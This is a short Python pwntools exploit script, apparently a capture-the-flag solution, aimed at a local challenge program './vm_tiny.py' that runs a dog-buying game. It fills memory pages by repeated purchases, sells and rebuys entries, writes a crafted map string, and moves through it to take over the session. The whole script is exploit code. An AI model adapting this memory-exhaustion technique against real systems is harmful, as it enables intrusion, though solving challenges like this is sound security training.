#!/usr/bin/python
from pwn import *

def buy_a_dog(data, answer = 'y'):
	r.sendlineafter('>', '2')
	r.sendlineafter('>', answer)
	r.sendline(data)

def sell_a_dog(data):
	r.sendlineafter('>', '3')
	r.sendlineafter('>', data)

def moving(direction):
	r.sendlineafter('>', direction)

r = process('./vm_tiny.py')
#context.log_level = 'debug'

payload = 'AAAA' 

for i in range(0, 0xfa):			# page max: 0x100 = 4(load_firm) + 1(load_map) + 0xfb
	buy_a_dog(payload)

for i in range(0, 6):
	sell_a_dog('aaa')
	buy_a_dog(payload, 'n')

new_map = '@'
new_map += '*'*(0x3c*3-1)
new_map += 'z'
new_map += ' '*(0x3c*(0x3c-3)-1)
buy_a_dog(new_map)

for i in range(0, 0x3):		
	for j in range(0, 0x3c): 		# return first location
		moving('d')
	moving('s')

r.sendlineafter('>', 'a')

r.interactive()